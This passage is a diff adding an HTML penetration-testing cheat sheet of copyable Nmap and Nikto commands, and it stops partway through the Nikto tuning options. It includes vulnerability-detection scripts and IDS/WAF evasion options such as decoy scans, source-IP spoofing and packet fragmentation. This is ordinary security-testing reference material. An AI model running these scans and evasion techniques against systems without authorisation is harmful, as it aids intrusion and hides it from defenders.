@@ -1,0 +1,1090 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Cheat Sheet — PRO</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600&family=Bebas+Neue&display=swap');
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --bg: #0a0a0f;
+  --surface: #0f0f1a;
+  --surface2: #141420;
+  --border: #1e1e35;
+  --green: #39ff14;
+  --green2: #00e676;
+  --cyan: #00e5ff;
+  --red: #ff1744;
+  --yellow: #ffea00;
+  --orange: #ff9100;
+  --purple: #b44aff;
+  --text: #d0d0e8;
+  --text-dim: #55556e;
+  --text-bright: #eeeeff;
+}
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'IBM Plex Mono', monospace;
+  min-height: 100vh;
+  padding: 0;
+  overflow-x: hidden;
+  font-size: 14px;
+  line-height: 1.6;
+}
+
+/* HERO */
+.hero {
+  position: relative;
+  padding: 60px 40px 40px;
+  border-bottom: 1px solid var(--border);
+  overflow: hidden;
+}
+.hero::before {
+  content: '';
+  position: absolute; inset: 0;
+  background:
+    radial-gradient(ellipse 60% 80% at 80% 50%, rgba(57,255,20,0.04) 0%, transparent 70%),
+    radial-gradient(ellipse 40% 60% at 20% 30%, rgba(0,229,255,0.03) 0%, transparent 60%);
+  pointer-events: none;
+}
+.hero-grid {
+  position: absolute; inset: 0;
+  background-image:
+    linear-gradient(rgba(57,255,20,0.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(57,255,20,0.03) 1px, transparent 1px);
+  background-size: 40px 40px;
+  pointer-events: none;
+}
+.hero-content { position: relative; max-width: 1200px; margin: 0 auto; }
+.hero-tag { font-size: 0.7rem; letter-spacing: 4px; color: var(--green); text-transform: uppercase; margin-bottom: 16px; opacity: 0.7; }
+.hero-title {
+  font-family: 'Bebas Neue', sans-serif;
+  font-size: clamp(3rem, 8vw, 7rem);
+  letter-spacing: 8px; line-height: 0.9;
+  color: var(--text-bright); margin-bottom: 20px;
+}
+.hero-title span { color: var(--green); }
+.hero-desc { font-size: 0.82rem; color: var(--text-dim); letter-spacing: 1px; max-width: 500px; }
+.tool-pills { display: flex; gap: 10px; margin-top: 24px; flex-wrap: wrap; }
+.pill { padding: 4px 14px; border-radius: 2px; font-size: 0.72rem; letter-spacing: 2px; font-weight: 600; text-transform: uppercase; }
+.pill-nmap { background: rgba(0,229,255,0.1); color: var(--cyan); border: 1px solid rgba(0,229,255,0.3); }
+.pill-nikto { background: rgba(255,23,68,0.1); color: var(--red); border: 1px solid rgba(255,23,68,0.3); }
+.pill-msf { background: rgba(180,74,255,0.1); color: var(--purple); border: 1px solid rgba(180,74,255,0.3); }
+.pill-level { background: rgba(255,145,0,0.1); color: var(--orange); border: 1px solid rgba(255,145,0,0.3); }
+
+/* MAIN */
+.main { max-width: 1200px; margin: 0 auto; padding: 40px; }
+
+/* TABS */
+.tabs { display: flex; gap: 4px; margin-bottom: 32px; border-bottom: 1px solid var(--border); }
+.tab {
+  padding: 10px 24px;
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 0.78rem; font-weight: 500;
+  letter-spacing: 2px; text-transform: uppercase;
+  cursor: pointer; border: none; background: transparent;
+  color: var(--text-dim); border-bottom: 2px solid transparent;
+  margin-bottom: -1px; transition: all 0.2s;
+}
+.tab:hover { color: var(--text); }
+.tab.active-nmap { color: var(--cyan); border-bottom-color: var(--cyan); }
+.tab.active-nikto { color: var(--red); border-bottom-color: var(--red); }
+.tab.active-msf { color: var(--purple); border-bottom-color: var(--purple); }
+.tab-content { display: none; }
+.tab-content.active { display: block; }
+
+/* SECTION */
+.section { margin-bottom: 36px; }
+.section-title {
+  font-size: 0.68rem; font-weight: 600;
+  letter-spacing: 3px; text-transform: uppercase;
+  color: var(--text-dim); margin-bottom: 14px;
+  padding-left: 12px; border-left: 2px solid var(--border);
+}
+.section-title.cyan { border-left-color: var(--cyan); color: var(--cyan); opacity: 0.7; }
+.section-title.red { border-left-color: var(--red); color: var(--red); opacity: 0.7; }
+.section-title.purple { border-left-color: var(--purple); color: var(--purple); opacity: 0.7; }
+
+/* CMD CARDS */
+.cmd-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 10px; }
+.cmd-card {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 3px; padding: 14px 16px;
+  cursor: pointer; transition: all 0.15s;
+  position: relative; overflow: hidden;
+}
+.cmd-card::before {
+  content: ''; position: absolute;
+  left: 0; top: 0; bottom: 0; width: 2px;
+  background: var(--accent, var(--green));
+  opacity: 0; transition: opacity 0.2s;
+}
+.cmd-card:hover { background: var(--surface2); border-color: #2a2a45; }
+.cmd-card:hover::before { opacity: 1; }
+.cmd-card.cyan { --accent: var(--cyan); }
+.cmd-card.red { --accent: var(--red); }
+.cmd-card.purple { --accent: var(--purple); }
+
+.cmd-name {
+  font-size: 0.68rem; font-weight: 600;
+  letter-spacing: 1.5px; text-transform: uppercase;
+  color: var(--text-dim); margin-bottom: 7px;
+}
+.cmd-code {
+  font-size: 0.84rem; font-weight: 400;
+  color: var(--text-bright); margin-bottom: 7px;
+  line-height: 1.6; word-break: break-all;
+}
+.cmd-code .f { color: var(--yellow); font-weight: 500; }
+.cmd-code .v { color: var(--green2); }
+.cmd-desc { font-size: 0.75rem; color: var(--text-dim); line-height: 1.55; }
+
+.badge {
+  display: inline-block; font-size: 0.58rem; font-weight: 600;
+  padding: 1px 6px; border-radius: 2px;
+  letter-spacing: 1px; margin-left: 8px; vertical-align: middle; text-transform: uppercase;
+}
+.b-warn { background: rgba(255,234,0,0.12); color: var(--yellow); border: 1px solid rgba(255,234,0,0.25); }
+.b-danger { background: rgba(255,23,68,0.12); color: var(--red); border: 1px solid rgba(255,23,68,0.25); }
+.b-root { background: rgba(255,145,0,0.12); color: var(--orange); border: 1px solid rgba(255,145,0,0.25); }
+
+/* TABLE */
+.flags-wrap { background: var(--surface); border: 1px solid var(--border); border-radius: 3px; overflow: hidden; }
+.flags-table { width: 100%; border-collapse: collapse; font-size: 0.78rem; }
+.flags-table tr { border-bottom: 1px solid var(--border); }
+.flags-table tr:last-child { border-bottom: none; }
+.flags-table td { padding: 9px 14px; }
+.flags-table td:first-child { color: var(--yellow); font-weight: 500; width: 130px; white-space: nowrap; }
+.flags-table td:last-child { color: var(--text-dim); }
+
+/* TOAST */
+.toast {
+  position: fixed; bottom: 30px; left: 50%;
+  transform: translateX(-50%) translateY(20px);
+  background: rgba(57,255,20,0.1); border: 1px solid var(--green);
+  color: var(--green); padding: 8px 22px; border-radius: 2px;
+  font-size: 0.75rem; letter-spacing: 3px;
+  opacity: 0; transition: all 0.25s; pointer-events: none; z-index: 999;
+}
+.toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+@media (max-width: 700px) {
+  .hero { padding: 40px 20px 30px; }
+  .main { padding: 24px 16px; }
+  .cmd-grid { grid-template-columns: 1fr; }
+  .tabs { overflow-x: auto; }
+}
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <div class="hero-grid"></div>
+  <div class="hero-content">
+    <div class="hero-tag">// security testing reference — pro edition</div>
+    <div class="hero-title">PENTEST<br><span>CHEAT SHEET</span></div>
+    <div class="hero-desc">Comprehensive command reference for network recon, web vulnerability scanning and exploitation.</div>
+    <div class="tool-pills">
+      <span class="pill pill-nmap">NMAP</span>
+      <span class="pill pill-nikto">NIKTO</span>
+      <span class="pill pill-msf">METASPLOIT</span>
+      <span class="pill pill-level">PRO</span>
+    </div>
+  </div>
+</div>
+
+<div class="main">
+  <div class="tabs">
+    <button class="tab active-nmap" onclick="switchTab('nmap', this)">NMAP</button>
+    <button class="tab" onclick="switchTab('nikto', this)">NIKTO</button>
+    <button class="tab" onclick="switchTab('msf', this)">METASPLOIT</button>
+  </div>
+
+  <!-- ===== NMAP ===== -->
+  <div class="tab-content active" id="tab-nmap">
+
+    <div class="section">
+      <div class="section-title cyan">// Host Discovery</div>
+      <div class="cmd-grid">
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Ping Sweep</div>
+          <div class="cmd-code">nmap <span class="f">-sn</span> &lt;network/cidr&gt;</div>
+          <div class="cmd-desc">Find all live hosts without port scanning</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Skip Host Discovery</div>
+          <div class="cmd-code">nmap <span class="f">-Pn</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Treat all hosts as up — scan even if no ping response</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">ARP Scan (LAN)</div>
+          <div class="cmd-code">nmap <span class="f">-PR -sn</span> &lt;network/cidr&gt;</div>
+          <div class="cmd-desc">Fast and reliable host discovery on local network</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">TCP SYN Ping</div>
+          <div class="cmd-code">nmap <span class="f">-PS</span><span class="v">22,80,443</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Discover hosts via SYN packets to specific ports</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">UDP Ping</div>
+          <div class="cmd-code">nmap <span class="f">-PU</span><span class="v">53,161</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Discover hosts via UDP — useful when ICMP is blocked</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">List Scan (No Scan)</div>
+          <div class="cmd-code">nmap <span class="f">-sL</span> &lt;network/cidr&gt;</div>
+          <div class="cmd-desc">List targets and do reverse DNS — no actual scanning</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title cyan">// Port Scanning</div>
+      <div class="cmd-grid">
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Default Scan (Top 1000)</div>
+          <div class="cmd-code">nmap &lt;target&gt;</div>
+          <div class="cmd-desc">Scan top 1000 ports — fast default</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">All 65535 Ports</div>
+          <div class="cmd-code">nmap <span class="f">-p-</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Full port sweep — slow but thorough</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Specific Ports</div>
+          <div class="cmd-code">nmap <span class="f">-p</span> <span class="v">22,80,443,3306,8080</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Scan only specified ports</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Port Range</div>
+          <div class="cmd-code">nmap <span class="f">-p</span> <span class="v">1-1024</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Scan a range of ports</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Top N Ports</div>
+          <div class="cmd-code">nmap <span class="f">--top-ports</span> <span class="v">100</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Scan the N most commonly used ports</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">SYN Scan (Stealth)</div>
+          <div class="cmd-code">nmap <span class="f">-sS</span> &lt;target&gt; <span class="badge b-root">ROOT</span></div>
+          <div class="cmd-desc">Half-open scan — less noisy, doesn't complete handshake</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">TCP Connect Scan</div>
+          <div class="cmd-code">nmap <span class="f">-sT</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Full TCP handshake — works without root, more detectable</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">UDP Scan</div>
+          <div class="cmd-code">nmap <span class="f">-sU</span> &lt;target&gt; <span class="badge b-warn">SLOW</span></div>
+          <div class="cmd-desc">Scan UDP — finds DNS(53), SNMP(161), DHCP(67)</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">TCP + UDP Combined</div>
+          <div class="cmd-code">nmap <span class="f">-sS -sU -p</span> <span class="v">T:80,U:53</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Scan both TCP and UDP in one run</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">FIN / NULL / Xmas Scans</div>
+          <div class="cmd-code">nmap <span class="f">-sF</span> / <span class="f">-sN</span> / <span class="f">-sX</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Firewall evasion techniques — may bypass stateless filters</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title cyan">// Detection & Fingerprinting</div>
+      <div class="cmd-grid">
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Service Version Detection</div>
+          <div class="cmd-code">nmap <span class="f">-sV</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Detect service names and versions on open ports</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">OS Detection</div>
+          <div class="cmd-code">nmap <span class="f">-O</span> &lt;target&gt; <span class="badge b-root">ROOT</span></div>
+          <div class="cmd-desc">Identify target operating system via TCP/IP fingerprinting</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Aggressive Scan</div>
+          <div class="cmd-code">nmap <span class="f">-A</span> &lt;target&gt; <span class="badge b-danger">NOISY</span></div>
+          <div class="cmd-desc">OS + versions + default scripts + traceroute</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Version Intensity Max</div>
+          <div class="cmd-code">nmap <span class="f">-sV --version-intensity</span> <span class="v">9</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Max probe level for version detection (0-9)</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Traceroute</div>
+          <div class="cmd-code">nmap <span class="f">--traceroute</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Map network path to the target</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">TTL & Window Size</div>
+          <div class="cmd-code">nmap <span class="f">-O --osscan-guess</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Aggressive OS guess when not 100% certain</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title cyan">// NSE Scripts</div>
+      <div class="cmd-grid">
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Default Scripts</div>
+          <div class="cmd-code">nmap <span class="f">-sC</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Run default safe NSE scripts</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Vulnerability Scan</div>
+          <div class="cmd-code">nmap <span class="f">--script vuln</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Run all vulnerability detection scripts</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Safe Scripts Only</div>
+          <div class="cmd-code">nmap <span class="f">--script safe</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Non-intrusive information gathering</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">HTTP Enumeration</div>
+          <div class="cmd-code">nmap <span class="f">--script http-enum -p</span> <span class="v">80,443</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Enumerate web directories and common paths</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">HTTP Methods</div>
+          <div class="cmd-code">nmap <span class="f">--script http-methods -p</span> <span class="v">80,443</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Show allowed HTTP methods (PUT, DELETE etc.)</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">HTTP Title</div>
+          <div class="cmd-code">nmap <span class="f">--script http-title -p</span> <span class="v">80,443,8080</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Get page titles from web services</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">SMB Vulnerabilities</div>
+          <div class="cmd-code">nmap <span class="f">--script smb-vuln-* -p</span> <span class="v">445</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Check EternalBlue, MS17-010 and other SMB vulns</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">SMB Shares</div>
+          <div class="cmd-code">nmap <span class="f">--script smb-enum-shares -p</span> <span class="v">445</span> &lt;target&gt;</div>
+          <div class="cmd-desc">List accessible SMB file shares</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Banner Grabbing</div>
+          <div class="cmd-code">nmap <span class="f">--script banner</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Grab service banners from all open ports</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">FTP Anonymous Login</div>
+          <div class="cmd-code">nmap <span class="f">--script ftp-anon -p</span> <span class="v">21</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Check if FTP allows anonymous access</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">SSH Auth Methods</div>
+          <div class="cmd-code">nmap <span class="f">--script ssh-auth-methods -p</span> <span class="v">22</span> &lt;target&gt;</div>
+          <div class="cmd-desc">List accepted SSH authentication methods</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">DNS Brute Force</div>
+          <div class="cmd-code">nmap <span class="f">--script dns-brute</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Enumerate subdomains via brute force</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">SSL Certificate Info</div>
+          <div class="cmd-code">nmap <span class="f">--script ssl-cert -p</span> <span class="v">443</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Get SSL certificate details and expiry</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Heartbleed Check</div>
+          <div class="cmd-code">nmap <span class="f">--script ssl-heartbleed -p</span> <span class="v">443</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Test for CVE-2014-0160 Heartbleed vulnerability</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">MySQL Info</div>
+          <div class="cmd-code">nmap <span class="f">--script mysql-info -p</span> <span class="v">3306</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Get MySQL server info and capabilities</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">RDP Screenshot</div>
+          <div class="cmd-code">nmap <span class="f">--script rdp-screenshot -p</span> <span class="v">3389</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Capture screenshot of RDP login screen</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title cyan">// Evasion & Firewall Bypass</div>
+      <div class="cmd-grid">
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Fragment Packets</div>
+          <div class="cmd-code">nmap <span class="f">-f</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Split packets into 8-byte fragments to evade IDS</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Decoy Scan</div>
+          <div class="cmd-code">nmap <span class="f">-D</span> <span class="v">RND:5</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Use 5 random decoy IPs to mask your real address</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Spoof Source IP</div>
+          <div class="cmd-code">nmap <span class="f">-S</span> <span class="v">&lt;spoof-ip&gt;</span> <span class="f">-e</span> <span class="v">eth0</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Spoof source IP address (use with care)</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Randomize Hosts</div>
+          <div class="cmd-code">nmap <span class="f">--randomize-hosts</span> &lt;network/cidr&gt;</div>
+          <div class="cmd-desc">Scan hosts in random order to avoid detection patterns</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Bad Checksum</div>
+          <div class="cmd-code">nmap <span class="f">--badsum</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Send packets with bad checksum — detects firewalls</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Source Port Spoof</div>
+          <div class="cmd-code">nmap <span class="f">--source-port</span> <span class="v">53</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Use port 53 (DNS) as source — bypasses some firewalls</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title cyan">// Output & Reporting</div>
+      <div class="cmd-grid">
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Normal Output</div>
+          <div class="cmd-code">nmap &lt;target&gt; <span class="f">-oN</span> <span class="v">scan.txt</span></div>
+          <div class="cmd-desc">Save human-readable output to file</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">XML Output</div>
+          <div class="cmd-code">nmap &lt;target&gt; <span class="f">-oX</span> <span class="v">scan.xml</span></div>
+          <div class="cmd-desc">Save as XML — importable into Metasploit</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Grepable Output</div>
+          <div class="cmd-code">nmap &lt;target&gt; <span class="f">-oG</span> <span class="v">scan.gnmap</span></div>
+          <div class="cmd-desc">Save in grep-friendly format for parsing</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">All Formats</div>
+          <div class="cmd-code">nmap &lt;target&gt; <span class="f">-oA</span> <span class="v">results</span></div>
+          <div class="cmd-desc">Save .nmap, .xml and .gnmap simultaneously</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Verbose</div>
+          <div class="cmd-code">nmap <span class="f">-v</span> / <span class="f">-vv</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Show results as they arrive (-vv = more detail)</div>
+        </div>
+        <div class="cmd-card cyan" onclick="copyCmd(this)">
+          <div class="cmd-name">Reason for State</div>
+          <div class="cmd-code">nmap <span class="f">--reason</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Show why nmap classified each port as open/closed</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title cyan">// Speed & Timing Reference</div>
+      <div class="flags-wrap">
+        <table class="flags-table">
+          <tr><td>-T0  Paranoid</td><td>Extremely slow — max IDS evasion, one packet every 5 min</td></tr>
+          <tr><td>-T1  Sneaky</td><td>Very slow — some IDS evasion</td></tr>
+          <tr><td>-T2  Polite</td><td>Slower — reduces bandwidth and resource use</td></tr>
+          <tr><td>-T3  Normal</td><td>Default timing — balanced speed and accuracy</td></tr>
+          <tr><td>-T4  Aggressive</td><td>Fast — assumes reliable, low-latency network</td></tr>
+          <tr><td>-T5  Insane</td><td>Very fast — may miss results on slow networks</td></tr>
+        </table>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ===== NIKTO ===== -->
+  <div class="tab-content" id="tab-nikto">
+
+    <div class="section">
+      <div class="section-title red">// Basic Scans</div>
+      <div class="cmd-grid">
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Basic Web Scan</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt;</div>
+          <div class="cmd-desc">Scan web server on port 80 for common vulnerabilities</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">HTTPS Scan</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-ssl</span></div>
+          <div class="cmd-desc">Force SSL/HTTPS scan on port 443</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Custom Port</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-p</span> <span class="v">8080</span></div>
+          <div class="cmd-desc">Scan web server on non-standard port</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">HTTPS Custom Port</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-ssl -p</span> <span class="v">8443</span></div>
+          <div class="cmd-desc">HTTPS scan on non-standard port</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Scan Multiple Ports</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-p</span> <span class="v">80,443,8080,8443</span></div>
+          <div class="cmd-desc">Scan multiple web ports in one run</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Scan via URL</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> <span class="v">https://&lt;target&gt;/path/</span></div>
+          <div class="cmd-desc">Scan starting from a specific URL path</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title red">// Authentication</div>
+      <div class="cmd-grid">
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Basic Auth</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-id</span> <span class="v">user:pass</span></div>
+          <div class="cmd-desc">Scan with HTTP basic authentication</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Cookie Auth</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-cookies</span> <span class="v">"session=abc123"</span></div>
+          <div class="cmd-desc">Pass session cookie for authenticated scanning</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Custom Header</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-useragent</span> <span class="v">"Mozilla/5.0"</span></div>
+          <div class="cmd-desc">Set a custom User-Agent string</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title red">// Evasion & Advanced</div>
+      <div class="cmd-grid">
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Through Burp Proxy</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-useproxy</span> <span class="v">http://127.0.0.1:8080</span></div>
+          <div class="cmd-desc">Route traffic through Burp Suite for inspection</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Evasion Mode 1</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-evasion</span> <span class="v">1</span></div>
+          <div class="cmd-desc">Random URI encoding — bypass basic WAF/IDS</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Evasion Mode 2</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-evasion</span> <span class="v">2</span></div>
+          <div class="cmd-desc">Directory self-reference (/./) insertion</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">No SSL Verify</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-nossl</span></div>
+          <div class="cmd-desc">Disable SSL certificate verification</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Disable DNS Lookup</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-nodns</span></div>
+          <div class="cmd-desc">Skip DNS lookups — faster, avoids DNS-based detection</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Pause Between Requests</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-pause</span> <span class="v">2</span></div>
+          <div class="cmd-desc">Wait 2 seconds between requests — evade rate limiting</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Timeout Setting</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-timeout</span> <span class="v">10</span></div>
+          <div class="cmd-desc">Set request timeout in seconds</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">Update Plugins</div>
+          <div class="cmd-code">nikto <span class="f">-update</span></div>
+          <div class="cmd-desc">Update Nikto plugins and databases</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title red">// Specific Tuning</div>
+      <div class="cmd-grid">
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">XSS Only</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-Tuning</span> <span class="v">4</span></div>
+          <div class="cmd-desc">Test for XSS and script injection only</div>
+        </div>
+        <div class="cmd-card red" onclick="copyCmd(this)">
+          <div class="cmd-name">SQL Injection Only</div>
+          <div class="cmd-code">nikto <span class="f">-h</span> &lt;target&gt; <span class="f">-Tuning</span> <span class="v">9</span></div>
